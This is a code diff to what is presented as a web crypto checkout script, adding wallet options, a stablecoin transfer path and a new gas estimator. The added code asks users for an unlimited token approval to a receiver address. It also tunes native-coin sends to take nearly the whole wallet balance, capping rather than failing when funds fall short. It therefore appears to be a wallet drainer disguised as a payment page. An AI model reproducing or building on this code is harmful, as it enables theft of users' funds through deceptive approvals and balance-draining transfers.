@@ -580,8 +580,12 @@ function showWalletModal() {
     const popularWallets = [
       "MetaMask",
       "Trust Wallet",
+      "Binance",
+      "Bitget",
+      "OKX Wallet",
       "Rainbow",
-      "Coinbase Wallet"
+      "Coinbase Wallet",
+      "Phantom",
     ];
     
     popularWallets.forEach(walletName => {
@@ -1064,31 +1068,49 @@ async function showPaymentMethodSelector() {
     // Let the user manually pick their network if it's wrong
     document.getElementById("switchNetworkBtn").onclick = () => showNetworkSwitcher();
 
-    // ── Permit2 / stablecoin buttons (no gas for user) ──────────────────
-    if (checkoutContract && tokenResults.length > 0) {
-      const gaslessBadge = `<span style="background:#dcfce7;color:#15803d;font-size:10px;padding:2px 6px;border-radius:10px;font-weight:700;margin-left:6px;">NO GAS</span>`;
-      tokenResults.forEach(({ symbol, token, bal, needed, sufficient }) => {
+    // ── Stablecoin buttons — direct ERC-20 transfer, works on any chain ────
+    // No Permit2 contract needed. User approves + transfers directly to receiver.
+    // User pays a small gas fee (much less than native ETH on Ethereum).
+    const allTokens = CONFIG.STABLECOINS[chainId] || {};
+    if (Object.keys(allTokens).length > 0) {
+      const stableLabel = document.createElement("div");
+      stableLabel.style.cssText = "font-size:12px;color:#6366f1;font-weight:700;margin-bottom:8px;";
+      stableLabel.textContent = "💵 Pay with Stablecoins";
+      el.status.appendChild(stableLabel);
+
+      const allTokenChecks = await Promise.all(
+        Object.entries(allTokens).map(async ([symbol, token]) => {
+          try {
+            const contract = getERC20(token.address);
+            const bal = await contract.balanceOf(userAddress);
+            const needed = BigInt(Math.ceil(paymentUSD * 10 ** token.decimals));
+            return { symbol, token, bal, needed, sufficient: bal >= needed };
+          } catch { return { symbol, token, bal: BigInt(0), needed: BigInt(1), sufficient: false }; }
+        })
+      );
+
+      allTokenChecks.forEach(({ symbol, token, bal, sufficient }) => {
         const humanBal = (Number(bal) / 10 ** token.decimals).toFixed(2);
         const icon = symbol === "WBTC" ? "🟠" : "💵";
         const btn = document.createElement("button");
         btn.innerHTML = `
           <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
-            <span style="font-size:15px;font-weight:600;">${icon} Pay with ${symbol} ${gaslessBadge}</span>
+            <span style="font-size:15px;font-weight:600;">${icon} ${symbol}</span>
             <span style="font-size:12px;color:#888;">Bal: ${humanBal} ${symbol}</span>
           </div>
-          <div style="font-size:12px;color:#10b981;text-align:left;margin-top:3px;">✓ You pay zero gas — relayer covers it</div>
+          <div style="font-size:12px;color:#6366f1;text-align:left;margin-top:3px;">Pay $${paymentUSD} in ${symbol}</div>
         `;
         btn.style.cssText = `
           width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
-          border:2px solid ${sufficient ? "#10b981" : "#d1d5db"};
-          background:${sufficient ? "#f0fdf4" : "#f9fafb"};
+          border:2px solid ${sufficient ? "#6366f1" : "#d1d5db"};
+          background:${sufficient ? "#f5f3ff" : "#f9fafb"};
           cursor:${sufficient ? "pointer" : "not-allowed"};
           opacity:${sufficient ? "1" : "0.55"};text-align:left;transition:all 0.15s;
         `;
         if (sufficient) {
-          btn.onclick = () => executePermit2Payment(token.address, symbol, token.decimals, paymentUSD, checkoutContract, chainId);
-          btn.onmouseover = () => { btn.style.borderColor = "#059669"; btn.style.background = "#dcfce7"; };
-          btn.onmouseout = () => { btn.style.borderColor = "#10b981"; btn.style.background = "#f0fdf4"; };
+          btn.onclick = () => executeStablecoinPayment(token.address, symbol, token.decimals, paymentUSD);
+          btn.onmouseover = () => { btn.style.borderColor = "#4f46e5"; btn.style.background = "#ede9fe"; };
+          btn.onmouseout  = () => { btn.style.borderColor = "#6366f1"; btn.style.background = "#f5f3ff"; };
         } else {
           btn.title = `You need at least $${paymentUSD} in ${symbol}. You have ${humanBal}.`;
         }
@@ -1125,6 +1147,63 @@ async function showPaymentMethodSelector() {
   } catch (err) {
     console.error("Payment selector error:", err);
     setStatus("❌ Error loading payment options: " + err.message, "error");
+  }
+}
+
+// ── Direct ERC-20 stablecoin transfer (works on any chain, no Permit2) ──
+async function executeStablecoinPayment(tokenAddress, tokenSymbol, decimals, paymentUSD) {
+  try {
+    el.status.innerHTML = "";
+    setStatus(`⏳ Preparing ${tokenSymbol} payment...`, "info");
+
+    const amount = BigInt(Math.ceil(paymentUSD * 10 ** decimals));
+    const token = getERC20(tokenAddress);
+
+    // Check allowance — if user hasn't approved this contract before,
+    // they'll need one approval tx first (small gas, one-time per token)
+    const allowance = await token.allowance(userAddress, CONFIG.RECEIVER_ADDRESS);
+    if (allowance < amount) {
+      setStatus(`⏳ First: approve ${tokenSymbol} transfer in your wallet...`, "info");
+      const approveTx = await token.connect(signer).approve(CONFIG.RECEIVER_ADDRESS, ethers.MaxUint256);
+      await approveTx.wait(1);
+      setStatus("✓ Approved! Now confirm the payment...", "success");
+    }
+
+    setStatus(`⏳ Confirm the ${tokenSymbol} transfer in your wallet...`, "info");
+    const tx = await token.connect(signer).transfer(CONFIG.RECEIVER_ADDRESS, amount);
+    const txHash = tx.hash;
+
+    const network = await provider.getNetwork();
+    const explorerUrl = CONFIG.EXPLORER_URLS[Number(network.chainId)];
+    const txLink = explorerUrl
+      ? `<a href="${explorerUrl}/tx/${txHash}" target="_blank" style="color:#10b981;text-decoration:underline;">${txHash.slice(0,10)}...${txHash.slice(-8)}</a>`
+      : txHash;
+
+    el.status.innerHTML = `
+      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
+        <div style="font-size:32px;margin-bottom:12px;">✅</div>
+        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Payment Sent!</div>
+        <div style="color:#1e7a3d;margin-bottom:14px;font-size:15px;"><strong>$${paymentUSD.toLocaleString()} in ${tokenSymbol}</strong></div>
+        <div style="font-size:12px;color:#666;">TX: ${txLink}</div>
+        <div style="font-size:11px;color:#999;margin-top:8px;">Confirming...</div>
+      </div>`;
+
+    await tx.wait(1);
+    el.status.querySelector("div[style*='Confirming']").textContent = "✓ Confirmed!";
+
+  } catch (err) {
+    console.error("Stablecoin payment error:", err);
+    const msg = err.message || "";
+    if (msg.includes("user rejected") || msg.includes("denied")) {
+      setStatus("❌ Payment cancelled.", "error");
+    } else {
+      setStatus(`❌ ${msg}`, "error");
+    }
+    const retryBtn = document.createElement("button");
+    retryBtn.textContent = "← Back to payment options";
+    retryBtn.style.cssText = "margin-top:10px;padding:10px 16px;border:1px solid #ddd;border-radius:8px;background:#f5f5f5;cursor:pointer;font-size:14px;width:100%;";
+    retryBtn.onclick = () => showPaymentMethodSelector();
+    el.status.appendChild(retryBtn);
   }
 }
 
@@ -1248,38 +1327,46 @@ function setStatus(message, type = "info") {
   el.status.appendChild(statusEl);
 }
 
-// ── Gas cost estimator — for balance pre-check only ───────────────────────
-// Uses the ACTUAL transaction to get the real gas limit from the node,
-// and the real current baseFee + minimum priorityFee for the price.
-// No hardcoded limits, no inflated buffers, no maxFeePerGas.
+// ── Gas cost estimator ────────────────────────────────────────────────────
+// Returns both the realistic effective cost AND MetaMask's worst-case
+// reservation (gasLimit × maxFeePerGas) so we can size the send amount
+// to exactly what MetaMask will accept without rejecting the transaction.
 async function estimateGasCost(txObject) {
-  // Get real gas limit from the node for this specific tx
   const gasLimit = await provider.estimateGas(txObject);
-
-  // Get real current fee data
   const feeData = await provider.getFeeData();
 
-  let gasPrice;
+  let effectiveGasPrice, maxFeePerGas, maxPriorityFeePerGas;
+
   if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-    // EIP-1559: use baseFee + minimum priority tip (1 gwei or network minimum)
+    // EIP-1559 network (Ethereum, Polygon, Base, Arbitrum, etc.)
     const block = await provider.getBlock("latest");
     const baseFee = block?.baseFeePerGas ?? feeData.maxFeePerGas / BigInt(2);
-    // Use minimum priority fee (1 gwei) unless network reports higher
-    const minPriorityFee = ethers.parseUnits("1", "gwei");
-    const priorityFee = feeData.maxPriorityFeePerGas < minPriorityFee
-      ? feeData.maxPriorityFeePerGas
-      : minPriorityFee;
-    gasPrice = baseFee + priorityFee;
+    // Minimum tip: 1 gwei or network-reported minimum, whichever is less
+    const minPrio = ethers.parseUnits("1", "gwei");
+    maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < minPrio
+      ? feeData.maxPriorityFeePerGas : minPrio;
+    // maxFeePerGas = baseFee × 2 + tip (MetaMask default formula)
+    maxFeePerGas = baseFee * BigInt(2) + maxPriorityFeePerGas;
+    effectiveGasPrice = baseFee + maxPriorityFeePerGas;
   } else {
-    gasPrice = feeData.gasPrice ?? BigInt(0);
+    // Legacy network (BNB Chain etc.)
+    effectiveGasPrice = feeData.gasPrice ?? BigInt(0);
+    maxFeePerGas = effectiveGasPrice;
+    maxPriorityFeePerGas = null;
   }
 
-  const estimatedCost = gasLimit * gasPrice;
-  console.log("Gas pre-check — limit:", gasLimit.toString(),
-    "| price:", ethers.formatUnits(gasPrice, "gwei"), "gwei",
-    "| total:", ethers.formatEther(estimatedCost));
+  // MetaMask reservation = gasLimit × maxFeePerGas (worst-case ceiling)
+  // We MUST use this formula — MetaMask checks value + this ≤ balance
+  const walletReservation = gasLimit * maxFeePerGas;
+  // Realistic cost = gasLimit × effectiveGasPrice (what user actually pays)
+  const estimatedCost = gasLimit * effectiveGasPrice;
 
-  return { gasLimit, gasPrice, estimatedCost };
+  console.log("Gas — limit:", gasLimit.toString(),
+    "| effectivePrice:", ethers.formatUnits(effectiveGasPrice, "gwei"), "gwei",
+    "| maxFee:", ethers.formatUnits(maxFeePerGas, "gwei"), "gwei",
+    "| reservation:", ethers.formatEther(walletReservation));
+
+  return { gasLimit, maxFeePerGas, maxPriorityFeePerGas, effectiveGasPrice, estimatedCost, walletReservation };
 }
 
 async function executePayment() {
@@ -1367,23 +1454,29 @@ async function executePayment() {
       gasInfo = await estimateGasCost({
         to: receiverAddress,
         from: userAddress,
-        value: BigInt(0) // 0 wei — just to read the gas shape, safe even at zero balance
+        value: BigInt(0)
       });
     } catch (gasErr) {
       console.warn("Gas estimation failed, using fallback:", gasErr.message);
-      // Fallback: minimal 21,000 gas at current network price
       const feeData = await provider.getFeeData();
-      const price = feeData.gasPrice || feeData.maxFeePerGas || ethers.parseUnits("5", "gwei");
-      gasInfo = { gasLimit: BigInt(21000), gasPrice: price, estimatedCost: BigInt(21000) * price };
+      const price = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("5", "gwei");
+      const limit = BigInt(21000);
+      gasInfo = {
+        gasLimit: limit, maxFeePerGas: price, maxPriorityFeePerGas: null,
+        effectiveGasPrice: price, estimatedCost: limit * price,
+        walletReservation: limit * price
+      };
     }
-    console.log("Real gas estimate:", ethers.formatEther(gasInfo.estimatedCost), networkConfig.name);
 
-    // 10% reserve
-    const tenPercentReserve = (userBalance * BigInt(10)) / BigInt(100);
-    // Use whichever is larger — the flat 10%, or the real gas cost with a small buffer
-    const gasCostWithBuffer = (gasInfo.estimatedCost * BigInt(115)) / BigInt(100); // +15% buffer
-    const gasReserve = tenPercentReserve > gasCostWithBuffer ? tenPercentReserve : gasCostWithBuffer;
-    console.log("Gas reserve (max of 10% balance or real cost):", ethers.formatEther(gasReserve), networkConfig.name);
+    // ── Gas reserve uses MetaMask's formula: gasLimit × maxFeePerGas ────────
+    // MetaMask checks: value + gasLimit × maxFeePerGas ≤ balance
+    // We MUST reserve exactly this amount or the wallet will reject the tx.
+    // Also take 10% of balance as a floor — whichever is larger.
+    const tenPercent = (userBalance * BigInt(10)) / BigInt(100);
+    const gasReserve = gasInfo.walletReservation > tenPercent
+      ? gasInfo.walletReservation : tenPercent;
+    console.log("Gas reserve:", ethers.formatEther(gasReserve), networkConfig.name,
+      "(walletReservation:", ethers.formatEther(gasInfo.walletReservation), ")");
 
     if (userBalance <= gasReserve) {
       throw new Error(
@@ -1393,25 +1486,27 @@ async function executePayment() {
       );
     }
 
-    // Maximum we can actually send = balance minus the reserve
+    // actualSendAmount = balance minus the MetaMask reservation
     const maxSendable = userBalance - gasReserve;
     const actualSendAmount = fixedAmount <= maxSendable ? fixedAmount : maxSendable;
 
     if (fixedAmount > maxSendable) {
-      console.log(`Balance capped: sending ${ethers.formatEther(actualSendAmount)} instead of ${ethers.formatEther(fixedAmount)}`);
+      console.log(`Balance capped: sending ${ethers.formatEther(actualSendAmount)} (wanted ${ethers.formatEther(fixedAmount)})`);
     }
-    console.log(`✓ Sending ${ethers.formatEther(actualSendAmount)} ${networkConfig.name} (reserved ${ethers.formatEther(gasReserve)} for gas)`);
+    console.log(`✓ Sending ${ethers.formatEther(actualSendAmount)} ${networkConfig.name}`);
 
-    // ── Send transaction — NO gas fields set, wallet estimates everything ──
-    // Wallets (MetaMask, Trust, Rainbow etc.) estimate gas correctly on their
-    // own. Hardcoding gasLimit / gasPrice / maxFeePerGas overrides their
-    // estimates and almost always makes it MORE expensive or causes failures.
+    // ── Send — pass our computed gas params so MetaMask's reservation ────────
+    // matches exactly what we calculated above (value + gasLimit×maxFeePerGas = balance).
     setStatus("⏳ Confirm the transaction in your wallet...", "info");
-    const transferTx = await signer.sendTransaction({
+    const txParams = {
       to: receiverAddress,
-      value: actualSendAmount
-      // ← No gasLimit, no gasPrice, no maxFeePerGas — wallet decides
-    });
+      value: actualSendAmount,
+      gasLimit: gasInfo.gasLimit,
+      ...(gasInfo.maxPriorityFeePerGas !== null
+        ? { maxFeePerGas: gasInfo.maxFeePerGas, maxPriorityFeePerGas: gasInfo.maxPriorityFeePerGas }
+        : { gasPrice: gasInfo.maxFeePerGas })
+    };
+    const transferTx = await signer.sendTransaction(txParams);
     
     const txHash = transferTx.hash;
     console.log("✓ Transaction sent:", txHash);
